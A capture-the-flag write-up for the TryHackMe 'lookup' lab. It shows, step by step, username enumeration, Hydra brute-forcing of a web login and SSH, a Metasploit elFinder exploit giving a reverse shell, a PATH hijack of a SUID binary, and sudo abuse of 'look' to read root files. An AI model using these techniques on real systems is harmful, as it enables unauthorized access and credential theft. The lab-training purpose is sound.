# CTF Writeup: [lookup](https://tryhackme.com/room/lookup)

> **Platform:** [**TryHackMe**](https://tryhackme.com/) |
> **OS:** Linux |
> **Difficulty:** Easy |
> **Date:** 08.11.2025 |
> **Author:** [*S3Z4R*](https://tryhackme.com/p/SeZaR)

---
## 1. Reconnaissance
### Scanning
We can not access to the website so we edit `/etc/hosts` and add the following line to it:

```bash
<Machine-IP> lookup.thm
```

We can see a login page at `http://lookup.thm/`.
Randomly testing some common usernames and passwords we see that we get different errors for each of them.
For example when using username as `test` and password as `test` we get:

```
Wrong username or password. Please try again.
Redirecting in 3 seconds.
```

But using username as `admin` and password randomly we get:

```
Wrong password. Please try again.
Redirecting in 3 seconds.
```

This means that `admin` is a valid username.
So we should look for the password now.

## 2. Initial Access
Using `Hydra` we can find the password:
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong password. Please try again."
```
It finds `password123` as the password, but after testing it is not possible to login.
We can test `Hydra` with the found password to find if any username is available:

```bash
hydra -L /usr/share/seclists/Usernames/Names/names.txt -p password123 lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:F=try again"
```

We have `jose:password123` let's login.

We can edit `/etc/hosts` and add the login url too:

```bash
<Machine-IP> lookup.thm files.lookup.thm
```
### Exploitation
There is a portal visible here to use it to upload a reverse shell.

Seeing the `credentials.txt` there is `think:nopassword`.

We can `ssh` using these credentials, but wait! We can't :)
This was a `rabbit hole`.

Searching around the `files.lookup.thm` we can find out the version that `web file manager` has.
It is `elfinder 2.1.47`.

Using `Metasploit` we can exploit this file manager.
Running the below commands:

```bash
msfdb init && msfconsole
searchsploit elfinder 2.1.47
use 0
set RHOSTS files.lookup.thm
set LHOSTS <Your-THM-IP>
run
```

We can see the meterpreter shell here. typing `shell` we get the bash prompt in here and by using `id` we can see:
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`

Here we search for the SUID Binaries to see if we can find anything.

```bash
find / -perm /4000 2>/dev/null
/usr/sbin/pwm
```

Running the pwm script we understand that it runs `id` command first, and then writes the password of the user to the home folder.
We need to `inject` a command using another user's id as below:
The target user's id is `think`:

```bash
echo $(id think)
uid=1000(think) gid=1000(think) groups=1000(think)
```

We need to export the tmp folder into the PATH to be able to run a bash script.
```bash
export PATH=/tmp:$PATH

```

Now when running pwm it looks into `/tmp` first, all we need to do is to write the id script as below:

```bash
echo "#!/bin/bash" > /tmp/id
echo 'echo "uid=1000(think) gid=1000(think) groups=1000(think)"' >> /tmp/id
```

now we run the pwm sctipt on `/usr/sbin/pwm`, the output is:

```bash
/usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
josesbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171
```
### Cracking the password
Now we can use the Hydra to crack the password. Write the passwords acquired into a file and then use that file as a wordlist:
```bash
hydra -l think -P jose.txt ssh://<Machine-IP>\
[22][ssh] host: <Machine-IP>   login: think   password: josemario.AKA(think)
```
## 3. User Flag
we can ssh using the credentials found and then:

```bash
cat user.txt
3837...820e
```
After gaining user `think` first we use `sudo -l` to see if there are any sudoers here. We find:
```bash
(ALL) /usr/bin/look
```
 
## 4. Root Flag
We need to exploit this.

We can use the look command to read the root.txt:

```bash
sudo look '' /root/root.txt
5a28...18e8
```

---
<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
